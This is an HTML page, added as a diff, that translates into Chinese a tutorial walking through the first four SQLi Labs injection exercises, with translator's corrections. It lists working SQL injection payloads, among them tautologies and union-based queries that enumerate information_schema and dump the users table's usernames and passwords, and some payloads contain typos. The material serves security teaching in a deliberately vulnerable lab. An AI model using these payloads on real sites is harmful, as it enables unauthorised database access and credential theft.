@@ -1,0 +1,421 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><style>/* Fonts */
+@font-face{
+  font-family: octicons-anchor;
+  src: url(data:x-font-woff;charset=utf-8;base64,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) format('woff');
+}
+
+/* Body */
+html { font-size: 100%; overflow-y: scroll; -webkit-text-size-adjust: 100%; -ms-text-size-adjust: 100%; }
+
+body{
+  color:#4d4d4c;
+  font-family:Georgia, Palatino, 'Palatino Linotype', Times, 'Times New Roman',
+              "Hiragino Sans GB", "STXihei", "微软雅黑", serif;
+  font-size:12px;
+  line-height:1.5em;
+  background:#fefefe;
+  width: 45em;
+  margin: 10px auto;
+  padding: 30px;
+  border: 1px solid #ddd;
+  outline: 1300px solid #f8f8f8;
+}
+
+/* Links */
+a{ color: #06d; text-decoration:none; }
+a:hover{ color: #06e; text-decoration: underline; }
+a:active{ color:#faa700; }
+a:focus{ outline: thin dotted; }
+a:hover, a:active{ outline: 0; }
+
+::-moz-selection { background:rgba(255,255,0,0.3); color:#000 }
+::selection { background:rgba(255,255,0,0.3); color:#000 }
+
+a::-moz-selection { background:rgba(255,255,0,0.3); color:#0645ad }
+a::selection { background:rgba(255,255,0,0.3); color:#0645ad }
+
+/* Header Anchor Links*/
+a.headeranchor-link {
+  color:#111;
+  border: 0;
+  margin-left: -20px;
+  padding-right: 6px;
+  cursor: pointer;
+  position: absolute;
+  display: block;
+  top: 0;
+  left: 0;
+  bottom: 0;
+}
+
+span.headeranchor {
+  font: normal normal 16px octicons-anchor;
+  line-height: 1;
+  -moz-osx-font-smoothing: grayscale;
+  -webkit-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+  user-select: none;
+}
+
+a.headeranchor-link:hover { text-decoration: none;}
+a.headeranchor-link:visited { color:#4d4d4c; }
+a.headeranchor-link:active { color:#4d4d4c; }
+a.headeranchor-link:hover span.headeranchor:before { content: '\f05c'; }
+h1:hover a span.headeranchor:before { content: '\f05c'; }
+h2:hover a span.headeranchor:before { content: '\f05c'; }
+h3:hover a span.headeranchor:before { content: '\f05c'; }
+h4:hover a span.headeranchor:before { content: '\f05c'; }
+h5:hover a span.headeranchor:before { content: '\f05c'; }
+h6:hover a span.headeranchor:before { content: '\f05c'; }
+
+abbr { cursor: pointer; }
+
+/* Paragraphs */
+p { margin:1em 0; }
+
+/* Images */
+img {
+  max-width:100%;
+  border: 0;
+  -ms-interpolation-mode: bicubic;
+  vertical-align: middle;
+}
+
+/* Headers */
+h1,h2,h3,h4,h5,h6 {
+  font-weight:normal;
+  color:#111;
+  line-height: 1.7;
+  position: relative;
+}
+h4,h5,h6{ font-weight: bold; }
+h1 { font-size:2.5em; border-bottom: 1px solid #ddd;}
+h2 { font-size:2em; border-bottom:1px solid #eee; padding-bottom: 5px; }
+h3 { font-size:1.5em; }
+h4 { font-size:1.2em; }
+h5 { font-size:1em; }
+h6 { font-size:0.9em; }
+
+/* Block Quotes */
+blockquote {
+  color:#666666;
+  margin:0;
+  padding-left: 3em;
+  border-left: 0.5em #EEE solid;
+}
+hr { display: block; height: 2px; border: 0; border-top: 1px solid #aaa;border-bottom: 1px solid #eee; margin: 1em 0; padding: 0; }
+
+/* Raw Blocks */
+span.backtick {
+  border:1px solid #EAEAEA;
+  border-radius:3px;
+  background:#F8F8F8;
+  padding:0 3px 0 3px;
+}
+
+pre, code, kbd, samp {
+  color: #000;
+  font-family: Consolas, "Liberation Mono", Menlo, Courier, monospace;
+  -webkit-border-radius: 3px;
+  -moz-border-radius: 3px;
+  border-radius: 3px;
+  font-size: 0.88em;
+  background-color: #F8F8F8;
+  border: 1px solid #CCC;
+}
+
+pre {
+  white-space: pre;
+  white-space: pre-wrap;
+  word-wrap: break-word;
+  padding: 10px;
+}
+
+code { padding: 0 3px 0 3px; }
+pre code { border: 0; padding: 0; }
+
+/* Admonition */
+div.admonition {
+  -webkit-border-radius: 3px;
+  -moz-border-radius: 3px;
+  border-radius: 3px;
+  font-size: 0.88em;
+  padding: 0.5em 1em 0.5em 1em;
+  margin: 10px auto;
+}
+
+div.admonition p {
+  padding: 0;
+  margin: 0.5em 0 0.5em 0;
+}
+
+p.admonition-title {
+  font-weight: bold;
+}
+
+div.admonition.attention {
+  color: #4F8A10;
+  background-color: #DFF2BF;
+  border: 1px solid #4F8A10;
+}
+
+div.admonition.caution {
+  color: #9F6000;
+  background-color: #FEEFB3;
+  border: 1px solid #9F6000;
+}
+
+div.admonition.hint {
+  color: #00529B;
+  background-color: #BDE5F8;
+  border: 1px solid #00529B;
+}
+
+div.admonition.danger {
+  color: #D8000C;
+  background-color: #FFBABA;
+  border: 1px solid #D8000C;
+}
+
+div.admonition.note {
+  color: #888888;
+  background-color: #F8F8F8;
+  border: 1px solid #888888;
+}
+
+/* Inlines */
+b, strong { font-weight: bold; }
+
+ins { background: #ff9; color: #000; text-decoration: none; }
+
+mark { background: #ff0; color: #000; font-style: italic; font-weight: bold; }
+
+sub, sup { font-size: 75%; line-height: 0; position: relative; vertical-align: baseline; }
+sup { top: -0.5em; }
+sub { bottom: -0.25em; }
+
+dfn { font-style: italic; }
+
+/* Lists */
+ul, ol { padding-left: 30px; }
+li p:last-child { margin:0 }
+li.task-list-item { list-style-type: none; }
+li.task-list-item input { float:left; margin-left: -20px; margin-top: 6px; }
+dt { font-weight: bold; font-style: italic;}
+dd { margin: 0 0 0 2em; }
+
+/* Tables */
+table { border-collapse: collapse; border: 1px solid #ddd; background-color: #fefefe; }
+table tr:nth-child(2n) { background-color: #f8f8f8; }
+td, th { border: 1px solid #ddd; padding: 6px 13px; }
+
+/* Codehilite Tables */
+table.codehilitetable { border: 0; border-spacing: 0; width: 100%; }
+td.linenos, td.code, table.codehilitetable td { border: 0; padding: 0; }
+table.codehilitetable td:not(.linenos) div.linenodiv { padding: 0 !important; }
+td.code { width: 100%; }
+table.codehilitetable td.linenos div pre, td div.linenodiv pre {
+  border: 0;
+  border-top: 1px solid #CCC;
+  border-left: 1px solid #CCC;
+  border-right: 1px solid #CCC;
+  border-bottom: 1px solid #CCC;
+  -webkit-border-radius: 0;
+  -moz-border-radius: 0;
+  border-radius: 0;
+  -webkit-border-top-left-radius: 3px;
+  -webkit-border-bottom-left-radius: 3px;
+  -moz-border-radius-topleft: 3px;
+  -moz-border-radius-bottomleft: 3px;
+  border-top-left-radius: 3px;
+  border-bottom-left-radius: 3px;
+}
+
+table.codehilitetable td.code div pre {
+  border: 0;
+  border-top: 1px solid #CCC;
+  border-right: 1px solid #CCC;
+  border-bottom: 1px solid #CCC;
+  -webkit-border-radius: 0;
+  -moz-border-radius: 0;
+  border-radius: 0;
+  -webkit-border-top-right-radius: 3px;
+  -webkit-border-bottom-right-radius: 3px;
+  -moz-border-radius-topright: 3px;
+  -moz-border-radius-bottomright: 3px;
+  border-top-right-radius: 3px;
+  border-bottom-right-radius: 3px;
+}
+
+/* Media */
+@media only screen and (min-width: 480px) {
+  body{ font-size:14px; }
+}
+
+@media only screen and (min-width: 768px) {
+  body{ font-size:16px; }
+}
+
+@media print {
+  * { background: transparent !important; color: black !important; filter:none !important; -ms-filter: none !important; }
+  body{ font-size:12pt; max-width:100%; outline:none; border: 0;}
+  a, a:visited { text-decoration: underline; }
+  a.headeranchor-link { display: none; }
+  hr { height: 1px; border:0; border-bottom:1px solid black; }
+  a[href]:after { content: " (" attr(href) ")"; }
+  abbr[title]:after { content: " (" attr(title) ")"; }
+  .ir a:after, a[href^="javascript:"]:after, a[href^="#"]:after { content: ""; }
+  pre, blockquote { border: 1px solid #999; padding-right: 1em; page-break-inside: avoid; }
+  tr, img { page-break-inside: avoid; }
+  img { max-width: 100% !important; }
+  p, h2, h3 { orphans: 3; widows: 3; }
+  h2, h3 { page-break-after: avoid; }
+}
+</style><title>SQLi Labs 指南 Part 1</title></head><body><p><img alt="1.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/1.png" /></p>
+<p>译者：SQL Libs一直也没看到有人写过比较完整的指南，只有作者在自己的博客上帖了一些tip和一些视频，偶然看到一篇文章在写这个，便拿过来翻一下，以作参考，原文较长，分成几个部分。</p>
+<h2 id="_1"><a name="user-content-_1" href="#_1" class="headeranchor-link"  aria-hidden="true"><span class="headeranchor"></span></a>简介</h2>
+<p>结构化查询语言，也叫做SQL，从根本上说是一种处理数据库的编程语言。对于初学者，数据库仅仅是在客户端和服务端进行数据存储。SQL通过结构化查询，关系，面向对象编程等等来管理数据库。编程极客们总是搞出许多这样类型的软件，像MySQL，MS SQL ,Oracle以及Postgresql。现在有一些程序能让我们有能力通过结构化查询来管理大型数据库。脚本小子们一定已经动手体验了类似SQL注入等这样的操作，虽然他们可能已经通过使用自动化工具例如SQL Map或者SQLNinja来实施攻击，但却还不知它真正的原理。在这篇简短的教程里，我将会尽力让你对SQL 注入是怎样工作的，攻击是怎样发生的以及什么是应用程序SQL漏洞有一个深入的理解。我们将要使用的实验室是SQLi Labs，它是一个可以从<a href="https://github.com/Audi-1/sqli-labs"><a href="https://github.com/Audi-1/sqli-labs"><a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></a></a>免费下载，以便我们研究学习以及编写安全的程序。所以这篇教程对于程序员和安全测试者都将是一次动手实践的机会。</p>
+<h2 id="_2"><a name="user-content-_2" href="#_2" class="headeranchor-link"  aria-hidden="true"><span class="headeranchor"></span></a>安装</h2>
+<ol>
+<li>从<a href="https://github.com/Audi-1/sqli-labs"><a href="https://github.com/Audi-1/sqli-labs"><a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></a></a>下载源代码</li>
+<li>将源代码复制到Apache webroot 文件夹（htddocs，/var/www）</li>
+<li>打开sql-connections文件夹下的“db-creds.inc”文件</li>
+<li>修改mysql用户名和密码为你自己的</li>
+<li>打开浏览器，通过localhost的index.html访问文件夹</li>
+<li>点击setup/resetDB 链接在你的mysql中创造数据库</li>
+<li>开始游戏！</li>
+</ol>
+<p><img alt="2.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/2.jpg" /></p>
+<h2 id="_3"><a name="user-content-_3" href="#_3" class="headeranchor-link"  aria-hidden="true"><span class="headeranchor"></span></a>实验</h2>
+<h3 id="get-"><a name="user-content-get-" href="#get-" class="headeranchor-link"  aria-hidden="true"><span class="headeranchor"></span></a>第一节：GET - 基于错误 - 单引号 - 字符型</h3>
+<p><img alt="3.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/3.png" /></p>
+<p>你会看到“Welcome Dhakkan”（一个北印度俚语，通常指愚蠢的人）。SQLI Labs的编码者一定是一个很幽默的人。现在我们用数字型注入可以得到一个“id”参数。</p>
+<p><strong>-&gt; ?id=1</strong></p>
+<p>开火！</p>
+<p><img alt="4.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/4.png" /></p>
+<p>任务完成！我们得到了登陆名 Dumb 和密码 Dump。我们在URL上添加了一个参数，并让这个参数指向第一条记录。这是便生成了一个从浏览器到数据库的表中的一个快速的查询，从而来获取“id=1”的记录。同样，你可以构造查询来得到后面的记录如 2,3,4......。</p>
+<p>在后端的实际查询如下：</p>
+<p><code>Select * from TABLE where id=1;</code></p>
+<p><strong>译者注：</strong></p>
+<p>原文这里只是给了简单的用了id=1来正常查询了一条记录，根据原程序作者博客的说明，这里应该是有一个字符型的单引号注入，如下解释：)</p>
+<p>在第一节index.php文件的第29行中：</p>
+<p><code>$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";</code></p>
+<p>这里的$id是被单引号包裹的。</p>
+<p>通过如下的注入查询可以验证：</p>
+<p><code>id=1'</code></p>
+<p><img alt="yi1.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/yi1.png" /></p>
+<p>（这样看来，原文作者上面给的实际执行的SQL语句就不对了，应为<strong>Select * from TABLE where id=&lsquo;1&rsquo;;</strong>）</p>
+<p>以下两个注入可以成功执行。</p>
+<p><code>' or '1'='1</code></p>
+<p><code>' or 1=1 --+</code></p>
+<p>后者采用的注释的方法。</p>
+<p>tip：order by语句可以用来获得字段数</p>
+<h3 id="get-_1"><a name="user-content-get-_1" href="#get-_1" class="headeranchor-link"  aria-hidden="true"><span class="headeranchor"></span></a>第二课： GET - 基于错误 - 数字型</h3>
+<p>现在我们尝试通过类似于输入字符串的方法来攻击应用程序，例如“abc”和“abcd”。我们注意到在lesson 2中我们收到了一个从数据库返回的错误。下面我们对数字做一些篡改，将&rsquo;（单引号）添加到数字中。</p>
+<p><img alt="5.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/5.png" /></p>
+<p>我们又得到了一个Mysql返回的错误，提示我们语法错误。</p>
+<p><strong>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’ LIMIT 0,1′ at line 1</strong></p>
+<p>现在执行的查询语句如下：</p>
+<p><code>Select * from TABLE where id = 1’ ;</code></p>
+<p>所以这里的奇数个单引号破坏了查询，导致抛出错误。</p>
+<p>因此我们得出的结果是，查询代码使用了整数。</p>
+<p><code>Select * from TABLE where id = (some integer value);</code></p>
+<p>现在，从开发者的视角来看，为了对这样的错误采取保护措施，我们可以注释掉剩余的查询：</p>
+<p><code>http://localhost/sqli-labs/Less-2/?id=1–-</code></p>
+<p>注意：一定要在注释符号后加空格，或者URL编码后的空格（%20），否则注释符号不会产生作用。</p>
+<p><img alt="6.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/6.png" /></p>
+<p><strong>译者注:</strong></p>
+<p>这小节中,原作者同样使用了单引号来注入，但这并不代表着这个小节，是基于字符串的，大家可以观察一个单引号注入后的出错信息，<br />
+<strong>&rsquo;&lsquo; LIMIT 0,1′ at line 1</strong>和上面我备注图中的引号个数是不一样的，稍微分析下，便可以明白。</p>
+<p>源代码中31,32行为此处的SQL查询语句。</p>
+<p><code>$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";</code></p>
+<p>可以成功注入的有：</p>
+<p><code>or 1=1</code><br />
+<code>or 1=1 --+</code></p>
+<h3 id="-"><a name="user-content--" href="#-" class="headeranchor-link"  aria-hidden="true"><span class="headeranchor"></span></a>第三课：基于错误-单引号变形-字符型</h3>
+<p>在这届课中，我们将会来学习实施一次基于错误的单引号攻击。在下面的截图中，我们使用</p>
+<p><code>?id='</code></p>
+<p><img alt="8.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/8.jpg" /></p>
+<p>注入代码后，我们得到像这样的一个错误：</p>
+<p><strong>MySQL server version for the right syntax to use near ””) LIMIT 0,1′ at line 1</strong></p>
+<p>这里它意味着，开发者使用的查询是：</p>
+<p><code>Select login_name, select password from table where id= (‘our input here’)</code></p>
+<p>所以我们再用这样的代码来进行注入：</p>
+<p><code>?id=1′) –-+</code></p>
+<p><img alt="11.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/11.jpg" /></p>
+<p>这样一来，我们便可以得到用户名和密码了，同时后面查询也已经被注释掉了。</p>
+<p><strong>译者注：</strong></p>
+<p>源代码中的SQL查询语句，31行：</p>
+<p><code>$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";</code></p>
+<p>可以成功注入的有：</p>
+<p><code>') or '1'=('1</code><br />
+<code>') or 1=1 --+</code></p>
+<h3 id="-_1"><a name="user-content--_1" href="#-_1" class="headeranchor-link"  aria-hidden="true"><span class="headeranchor"></span></a>第四课：基于错误-双引号-字符型</h3>
+<p>在这节课中，我们将会学习进行一个基于错误的双引号攻击，如下图所示：</p>
+<p><code>?id=1"</code></p>
+<p><img alt="13.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/13.jpg" /></p>
+<p>注入这段代码后，我们可以看到一个用户名和密码。(译者注：这里看不到用户名密码，反而是出错信息，暂时弄不清楚作者为什么出现这个情况)现在我们可以尝试着去下载数据库来检索一些敏感信息。我们假设一开始数据库中有3列信息。那么我们这里就可以用联合查询命令来下载数据库：</p>
+<p><code>?id=1") union selcect 1,2,3 --+</code></p>
+<p>现在做一些SQL的基本操作，我们启动mysql，然后通过查询检查下数据库:</p>
+<p><code>show databases;</code></p>
+<p><img alt="15.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/15.jpg" /></p>
+<p>这个实验用到的数据库名为<strong>security</strong>,所以我们选择security来执行命令。</p>
+<p><code>use security;</code></p>
+<p><img alt="17.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/17.jpg" /></p>
+<p>我们可以查看下这个数据库中有哪些表</p>
+<p><code>show tables;</code></p>
+<p><img alt="19.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/19.jpg" /></p>
+<p>现在我们可以看到这里有四张表，然后我们来看下这张表的结构。</p>
+<p><code>desc emails;</code></p>
+<p><img alt="22.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/22.jpg" /></p>
+<p>在继续进行前台攻击时，我们想讨论下系统数据库，即<strong>information_schema</strong>。所以我们使用它</p>
+<p><code>use information_schema</code></p>
+<p><img alt="24.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/24.jpg" /></p>
+<p>让我们来看下表格。</p>
+<p><code>show tables;</code></p>
+<p><img alt="26.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/26.jpg" /></p>
+<p>现在我们先来枚举这张表</p>
+<p><code>desc tables;</code></p>
+<p><img alt="28.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/28.jpg" /></p>
+<p>现在我们来使用这个查询：</p>
+<p><code>select table_name from information_schema.tables where table_schema = "security";</code></p>
+<p><img alt="30.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/30.jpg" /></p>
+<p>使用这个查询，我们可以下载到表名。我们现在来将这个查询注入到URL，查询变为</p>
+<p><code>?id=1”) union select 1,table_name,3 from information_schema.tables where table_schema=’security’ --+</code></p>
+<p><strong>译者注：</strong></p>
+<p><em>start</em></p>
+<p>这里原文作者可能本意的查询语句是如下这个：</p>
+<p><code>?id=”) union select 1,table_name,3 from information_schema.tables where table_schema=’security’ --+</code></p>
+<p>现在我们可以从屏幕中看到第一个表名email。</p>
+<p><em>end</em></p>
+<p><img alt="32.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/32.jpg" /></p>
+<p>另一个方法是将所有表的名字分组然后作为文本把它下载下来。查询如下：</p>
+<p><code>?id=1') union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’ –-+</code></p>
+<p><strong>译者注：</strong></p>
+<p><em>start</em></p>
+<p>这里原文作者可能本意的查询语句是如下这个：</p>
+<p><code>?id='') union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’ –-+</code></p>
+<p>现在我们可以从屏幕中看到第一个表名email。</p>
+<p><em>end</em></p>
+<p>我们可以从结果中看到所有的表。</p>
+<p><img alt="33.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/33.png" /></p>
+<p>我们合并多个不同的列，并下载下来。</p>
+<p><code>?id=1' union select 1,group_concat(username),group_concat(password) from users –-+</code></p>
+<p><strong>译者注：</strong></p>
+<p><em>start</em></p>
+<p>这里原文作者可能本意的查询语句是如下这个：</p>
+<p><code>?id=' union select 1,group_concat(username),group_concat(password) from users –-+</code></p>
+<p><em>end</em></p>
+<p>结果如图所示。</p>
+<p><img alt="35.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/35.jpg" /></p>
+<p><strong>译者注：</strong></p>
+<p>上面三个联合查询，id后面的符号，要根据你所在的那个实验里面，根据作者的截图，它是在第一个实验里，所以是使用的单引号，如果是在基于双引号的查询里，需要使用双引号。</p>
+<p>另外三个联合查询作者给的注入语句，id后都有一个1，这时候是显示不出来你想要的，因为这时候注入的查询语句会返回两行，而只是显示第一行。</p>
+<p>源代码中sql查询语句，31,31行：</p>
+<p><code>$id = '"' . $id . '"';</code></p>
+<p><code>$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";</code></p>
+<p>可以成功注入的有：</p>
+<p><code>")or ("1")=("1</code></p>
+<p><code>")or 1=1 --+</code></p>
+<p>via:<a href="http://resources.infosecinstitute.com/tutorial-on-sqli-labs/">infosecinstitute</a></p></body></html>
